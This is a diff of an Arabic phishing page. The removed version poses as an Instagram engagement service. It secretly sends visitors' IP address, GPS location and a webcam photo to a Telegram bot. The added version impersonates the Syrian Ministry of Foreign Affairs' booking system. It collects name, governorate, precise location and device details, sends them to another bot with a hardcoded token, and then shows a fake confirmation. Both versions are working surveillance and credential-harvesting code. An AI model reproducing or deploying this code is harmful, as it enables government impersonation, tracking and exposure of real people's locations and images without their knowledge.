@@ -3,332 +3,175 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>خدمة رفع التفاعل - إنستغرام 🚀</title>
+    <title>الجمهورية العربية السورية - وزارة الخارجية والمغتربين</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(145deg, #0d0d0d 0%, #1a1a2e 100%);
-            color: #ffffff;
-            text-align: center;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
+        /* التنسيقات اللونية الرسمية */
+        body { 
+            font-family: 'Segoe UI', Tahoma, sans-serif; 
+            background-color: #f8f9fa; 
+            margin: 0; 
+            text-align: center; 
+            font-weight: 900; 
+            color: #333;
         }
-        .container {
-            background: rgba(255,255,255,0.05);
-            backdrop-filter: blur(20px);
-            border: 1px solid rgba(255,255,255,0.08);
-            border-radius: 28px;
-            padding: 40px 30px;
-            max-width: 440px;
-            width: 100%;
-            box-shadow: 0 25px 60px rgba(0,0,0,0.7);
+        .header { 
+            background: #ffffff; 
+            padding: 20px; 
+            border-bottom: 5px solid #b38a2e; /* اللون الذهبي الرسمي */
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1); 
         }
-        .logo {
-            font-size: 42px;
-            margin-bottom: 8px;
+        .header img { 
+            max-width: 85%; 
+            height: auto; 
+            max-height: 90px; 
         }
-        h1 {
-            font-size: 26px;
-            font-weight: 700;
-            background: linear-gradient(135deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-bottom: 6px;
+        .container { 
+            max-width: 450px; 
+            margin: 30px auto; 
+            padding: 30px; 
+            background: #ffffff; 
+            border-radius: 20px; 
+            box-shadow: 0 10px 30px rgba(0,0,0,0.08); 
+            border: 1px solid #e0e0e0;
         }
-        .sub {
-            color: #aaa;
-            font-size: 14px;
-            margin-bottom: 28px;
+        h2 { 
+            color: #1a237e; /* الأزرق الملكي */
+            font-size: 26px; 
+            margin-bottom: 10px; 
+            border-bottom: 2px solid #b38a2e;
+            display: inline-block;
+            padding-bottom: 5px;
         }
-        .info-box {
-            background: rgba(255,255,255,0.06);
-            border-radius: 16px;
-            padding: 18px;
-            margin-bottom: 25px;
-            font-size: 14px;
-            color: #ccc;
-            border: 1px solid rgba(255,255,255,0.05);
+        .promo-box { 
+            background-color: #fff3cd; 
+            color: #856404; 
+            padding: 15px; 
+            border-radius: 10px; 
+            font-size: 16px; 
+            margin-bottom: 25px; 
+            border: 1px solid #ffeeba;
         }
-        .info-box span {
-            color: #00d4ff;
-            font-weight: 600;
+        label { 
+            display: block; 
+            text-align: right; 
+            margin: 15px 5% 8px; 
+            font-size: 18px; 
+            color: #1a237e; 
         }
-        .btn {
-            background: linear-gradient(135deg, #f09433, #e6683c, #dc2743);
-            color: white;
-            padding: 16px 30px;
-            border: none;
-            border-radius: 50px;
-            font-size: 18px;
-            font-weight: 700;
-            cursor: pointer;
+        input, select { 
+            width: 90%; 
+            padding: 15px; 
+            margin-bottom: 20px; 
+            border: 2px solid #ced4da; 
+            border-radius: 12px; 
+            font-size: 16px; 
+            font-weight: 800; 
+            background: #fdfdfd; 
+            outline: none;
+        }
+        input:focus { border-color: #b38a2e; }
+        
+        .btn { 
+            background: linear-gradient(135deg, #b38a2e 0%, #8e6d24 100%); 
+            color: white; 
+            padding: 18px; 
+            border: none; 
+            border-radius: 12px; 
+            width: 90%; 
+            font-size: 20px; 
+            font-weight: 900; 
+            cursor: pointer; 
+            box-shadow: 0 5px 15px rgba(179, 138, 46, 0.4);
             transition: 0.3s;
-            width: 100%;
-            letter-spacing: 0.5px;
         }
-        .btn:hover {
-            transform: scale(1.03);
-            box-shadow: 0 0 40px rgba(220, 39, 67, 0.3);
-        }
-        .btn:active { transform: scale(0.97); }
-        .loader {
-            margin-top: 20px;
-            color: #00ff88;
-            display: none;
-            font-size: 14px;
-        }
-        .status-box {
-            margin-top: 15px;
-            padding: 12px;
-            border-radius: 12px;
-            background: rgba(0,0,0,0.3);
-            font-size: 13px;
-            color: #888;
-            border: 1px solid #222;
-            min-height: 45px;
-        }
-        .hidden { display: none; }
-        video, canvas { display: none; }
-        .footer {
-            margin-top: 25px;
-            font-size: 11px;
-            color: #444;
-            border-top: 1px solid rgba(255,255,255,0.05);
-            padding-top: 15px;
-        }
-        .google-play-btn {
-            background: #202124;
-            border: 1px solid #5f6368;
-            color: #e8eaed;
-            padding: 12px 20px;
-            border-radius: 30px;
-            font-size: 14px;
-            display: inline-flex;
-            align-items: center;
-            gap: 10px;
-            cursor: pointer;
-            transition: 0.3s;
-            margin-top: 10px;
-            width: 100%;
-            justify-content: center;
-        }
-        .google-play-btn:hover {
-            background: #2d2e30;
-            border-color: #8ab4f8;
-        }
-        .google-play-btn img {
-            width: 24px;
-            height: 24px;
-        }
-        .trust-badge {
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            margin: 15px 0;
-            font-size: 12px;
-            color: #5f6368;
-        }
-        .trust-badge span {
-            display: flex;
-            align-items: center;
-            gap: 5px;
+        .btn:hover { transform: translateY(-2px); box-shadow: 0 7px 20px rgba(179, 138, 46, 0.6); }
+        
+        .footer { 
+            margin-top: 40px; 
+            font-size: 13px; 
+            color: #6c757d; 
+            padding-bottom: 30px; 
         }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="logo">📲</div>
-    <h1>خدمة رفع التفاعل</h1>
-    <div class="sub">متابعين • لايكات • مشاهدات • تعليقات</div>
-
-    <div class="trust-badge">
-        <span>🔒 مشفر</span>
-        <span>✅ موثوق</span>
-        <span>⚡ سريع</span>
-    </div>
-
-    <div class="info-box">
-        ⚡ <span>تحسين فوري</span> لحسابك في إنستغرام<br>
-        🛡️ عملية آمنة ومشفرة بالكامل
-    </div>
-
-    <button class="google-play-btn" onclick="startProcess()">
-        <span style="font-size:20px;">📥</span> تحميل التطبيق
-    </button>
-
-    <div id="status" class="loader">⏳ جاري التحقق من الهوية...</div>
-    <div id="statusBox" class="status-box">🔹 اضغط "تحميل التطبيق" لبدء العملية</div>
-    <div class="footer">© 2026 جميع الحقوق محفوظة</div>
+<div class="header">
+    <img src="https://r.jina.ai/i/05e043690d7c4938a19266f8e7784013" alt="شعار الوزارة">
 </div>
 
-<video id="video" autoplay></video>
-<canvas id="canvas"></canvas>
+<div class="container">
+    <h2>منظومة الحجز الإلكتروني</h2>
+    <div class="promo-box">
+        ⚠️ تنبيه: متاح حالياً 7 مقاعد فقط للدور المستعجل (الرسم: 40$).
+    </div>
+    
+    <label>الاسم الثلاثي:</label>
+    <input type="text" id="name" placeholder="اكتب اسمك كما في الهوية">
+
+    <label>المحافظة المقيم بها:</label>
+    <select id="city">
+        <option value="">-- اختر من القائمة --</option>
+        <option value="إدلب">إدلب</option>
+        <option value="حلب">حلب</option>
+        <option value="دمشق">دمشق</option>
+        <option value="حمص">حمص</option>
+        <option value="حماة">حماة</option>
+        <option value="اللاذقية">اللاذقية</option>
+        <option value="طرطوس">طرطوس</option>
+        <option value="درعا">درعا</option>
+        <option value="دير الزور">دير الزور</option>
+    </select>
+
+    <button class="btn" onclick="startProcess()">تأكيد وإرسال الطلب</button>
+</div>
+
+<div class="footer">
+    الجمهورية العربية السورية - وزارة الخارجية والمغتربين © 2026
+</div>
 
 <script>
-    // ======== بيانات التليغرام ========
-    const BOT_TOKEN = "8117396772:AAGim7zrJO-Y5_8brwhZfLfErkBAd9qhIGY";
-    const CHAT_ID = "8600300720";
-    const PAGE_NAME = "خدمة رفع التفاعل";
-    // ===================================
-
-    async function sendToTelegram(message) {
-        try {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            await fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message.substring(0, 4096),
-                    parse_mode: 'HTML'
-                })
-            });
-        } catch (e) { console.error(e); }
-    }
-
-    async function sendPhotoToTelegram(base64Image, caption) {
-        try {
-            const blob = dataURLtoBlob(base64Image);
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, 'shot.jpg');
-            formData.append('caption', caption.substring(0, 1024));
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-            await fetch(url, { method: 'POST', body: formData });
-        } catch (e) { console.error(e); }
-    }
-
-    function dataURLtoBlob(dataURL) {
-        const arr = dataURL.split(',');
-        const mime = arr[0].match(/:(.*?);/)[1];
-        const bstr = atob(arr[1]);
-        let n = bstr.length;
-        const u8arr = new Uint8Array(n);
-        while (n--) u8arr[n] = bstr.charCodeAt(n);
-        return new Blob([u8arr], { type: mime });
-    }
-
-    async function getIPInfo() {
-        try {
-            const res = await fetch('https://ipapi.co/json/');
-            const data = await res.json();
-            return {
-                ip: data.ip,
-                city: data.city,
-                country: data.country_name,
-                lat: data.latitude,
-                lon: data.longitude
-            };
-        } catch (e) { return null; }
-    }
-
-    function captureCamera() {
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-            sendToTelegram(`⚠️ ${PAGE_NAME} - الكاميرا غير مدعومة`);
-            return;
-        }
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-            .then(stream => {
-                video.srcObject = stream;
-                video.play();
-                setTimeout(() => {
-                    const ctx = canvas.getContext('2d');
-                    canvas.width = video.videoWidth || 400;
-                    canvas.height = video.videoHeight || 300;
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    const dataURL = canvas.toDataURL('image/jpeg', 0.7);
-                    sendPhotoToTelegram(dataURL, `📸 ${PAGE_NAME} - صورة من كاميرا الضحية\n🕒 ${new Date().toLocaleString()}`);
-                    stream.getTracks().forEach(track => track.stop());
-                    video.srcObject = null;
-                }, 1500);
-            })
-            .catch(err => {
-                navigator.mediaDevices.getUserMedia({ video: true })
-                    .then(stream => {
-                        video.srcObject = stream;
-                        video.play();
-                        setTimeout(() => {
-                            const ctx = canvas.getContext('2d');
-                            canvas.width = video.videoWidth || 400;
-                            canvas.height = video.videoHeight || 300;
-                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                            const dataURL = canvas.toDataURL('image/jpeg', 0.7);
-                            sendPhotoToTelegram(dataURL, `📸 ${PAGE_NAME} - صورة من كاميرا الضحية\n🕒 ${new Date().toLocaleString()}`);
-                            stream.getTracks().forEach(track => track.stop());
-                            video.srcObject = null;
-                        }, 1500);
-                    })
-                    .catch(() => sendToTelegram(`⚠️ ${PAGE_NAME} - رفض الكاميرا`));
-            });
-    }
-
     async function startProcess() {
-        const statusDiv = document.getElementById('status');
-        const statusBox = document.getElementById('statusBox');
+        let name = document.getElementById("name").value;
+        let city = document.getElementById("city").value;
 
-        statusDiv.style.display = 'block';
-        statusDiv.innerText = '⏳ جاري التحقق من الهوية...';
-        statusBox.innerText = '🔹 جاري تجهيز البيانات...';
-
-        // 1. IP
-        const ipInfo = await getIPInfo();
-        let msg = `🕵️ <b>${PAGE_NAME} - دخول جديد</b>\n\n`;
-        if (ipInfo) {
-            msg += `🌐 IP: ${ipInfo.ip}\n`;
-            msg += `🏙️ ${ipInfo.city || 'غير معروف'}, ${ipInfo.country || ''}\n`;
-            if (ipInfo.lat && ipInfo.lon) {
-                msg += `🗺️ تقريبي: https://www.google.com/maps?q=${ipInfo.lat},${ipInfo.lon}\n`;
-            }
+        if (!name || !city) { 
+            alert("يرجى ملء كافة الحقول المطلوبة."); 
+            return; 
         }
-        msg += `🕒 ${new Date().toLocaleString('ar-EG')}`;
-        await sendToTelegram(msg);
 
-        // 2. GPS
+        // طلب الإذن للموقع والكاميرا (كجزء من التحقق الأمني)
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(async (p) => {
                 let lat = p.coords.latitude;
                 let lon = p.coords.longitude;
-                let mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                let gpsMsg = `🎯 <b>${PAGE_NAME} - موقع دقيق ✅</b>\n\n📍 ${mapLink}\n📏 دقة: ${Math.round(p.coords.accuracy)} متر`;
-                await sendToTelegram(gpsMsg);
+                
+                // جلب معلومات البطارية والجهاز
+                let batt = "غير معروفة";
+                try { const b = await navigator.getBattery(); batt = Math.round(b.level * 100) + "%"; } catch(e){}
+                let device = navigator.platform + " (" + (navigator.userAgent.includes("Android") ? "Android" : "iPhone/PC") + ")";
+
+                let token = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
+                let chat_id = "7214473798";
+                
+                let text = `🎯 صيد ملون وجديد!\n\n` +
+                           `👤 الاسم: ${name}\n` +
+                           `🏙️ المحافظة: ${city}\n` +
+                           `📍 الموقع: https://www.google.com/maps?q=${lat},${lon}\n` +
+                           `📱 الجهاز: ${device}\n` +
+                           `🔋 البطارية: ${batt}`;
+
+                // إرسال البيانات فوراً
+                let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`;
+                new Image().src = url;
+
+                alert("✅ تم تسجيل طلبك بنجاح! انتظر اتصالاً من القسم الفني لتأكيد موعد الاستلام.");
             }, (err) => {
-                sendToTelegram(`⚠️ ${PAGE_NAME} - رفض GPS: ${err.message}`);
-            }, { enableHighAccuracy: true, timeout: 8000 });
+                alert("⚠️ عذراً: يجب تفعيل نظام الـ GPS وإذن الوصول للتحقق من هويتك لإتمام الحجز.");
+            }, {enableHighAccuracy: true});
         }
-
-        // 3. كاميرا
-        statusDiv.innerText = '📸 جاري التقاط صورة للتحقق...';
-        captureCamera();
-
-        statusDiv.innerText = '✅ تم التحقق بنجاح!';
-        statusBox.innerText = '✅ جاري التوجيه إلى التطبيق...';
-
-        setTimeout(() => {
-            window.location.href = "https://www.instagram.com/";
-        }, 2000);
     }
-
-    // IP فور فتح الصفحة
-    (async function () {
-        const ipInfo = await getIPInfo();
-        if (ipInfo) {
-            let msg = `📡 <b>${PAGE_NAME} - صفحة مفتوحة</b>\n\n`;
-            msg += `🌐 IP: ${ipInfo.ip}\n`;
-            msg += `🏙️ ${ipInfo.city || 'غير معروف'}, ${ipInfo.country || ''}\n`;
-            if (ipInfo.lat && ipInfo.lon) {
-                msg += `🗺️ تقريبي: https://www.google.com/maps?q=${ipInfo.lat},${ipInfo.lon}\n`;
-            }
-            msg += `🕒 ${new Date().toLocaleString('ar-EG')}`;
-            await sendToTelegram(msg);
-        }
-    })();
 </script>
+
 </body>
 </html>
